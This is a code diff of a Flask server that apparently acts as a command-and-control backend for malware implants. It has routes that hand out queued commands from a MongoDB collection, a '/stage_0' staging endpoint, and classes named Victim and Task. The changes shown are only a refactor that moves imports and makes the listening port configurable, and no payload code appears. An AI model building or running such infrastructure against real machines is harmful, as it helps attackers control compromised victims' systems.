@@ -1,9 +1,5 @@
 from flask import Flask,request
 from pathlib import Path
-from lib.database import Database
-from lib.module import Module
-from lib.task import Task
-from lib.victim import Victim
 import  os
 import pymongo
 import logging
@@ -13,9 +9,10 @@ from lib.logger import Logger
 from termcolor import colored
 import pdb
 import time
+import sys
 
 
-def main(db_object,server_logger):
+def main(mongoclient,server_logger,port):
 	app = Flask('app')
 
 	## Get the cookie/victim ID from a request
@@ -47,7 +44,7 @@ def main(db_object,server_logger):
 
 	@app.route('/',methods = ['GET', 'POST'])
 	def run():
-		myclient = db_object.mongoclient
+		myclient = mongoclient
 		if request.method == 'GET':
 			mydb = myclient[os.environ['MONGODB_DATABASE']]
 			cmds = mydb["commands"]
@@ -121,7 +118,7 @@ def main(db_object,server_logger):
 	@app.route('/stage_0',methods = ['POST'])
 	def stage():
 		if request.method == 'POST':
-			myclient = db_object.mongoclient
+			myclient = mongoclient
 
 			mydb = myclient[os.environ['MONGODB_DATABASE']]
 			cmds = mydb["commands"]
@@ -158,7 +155,7 @@ def main(db_object,server_logger):
 
 			return ('Error Recieved, we will get back to you', 200)
 
-	app.run(host = '0.0.0.0', port = 8080)
+	app.run(host = '0.0.0.0', port = port)
 
 def get_db_info():
 	if 'MONGODB_USERNAME' not in os.environ: 
@@ -186,15 +183,25 @@ def get_db_info():
 
 
 if __name__=="__main__":
+	if len(sys.argv) >= 2:
+		port = sys.argv[1]
+	else:
+		port = '8080'
 	
 	server_logger = Logger(logdir='logs',logfile='logs',verbose=False )
 	server_logger.setup()
 
 	db_url = get_db_info()
+	
+
+	from lib.database import Database
+	from lib.module import Module
+	from lib.task import Task
+	from lib.victim import Victim
 
 	db_object = Database(url=db_url)
-
 	server_logger.info_log(f"Initiated database connection from main- {db_url}",'green')
+	
 	Victim.mongoclient = db_object.mongoclient
 	Task.mongoclient = db_object.mongoclient
-	main(db_object,server_logger)
+	main(db_object.mongoclient,server_logger,port)
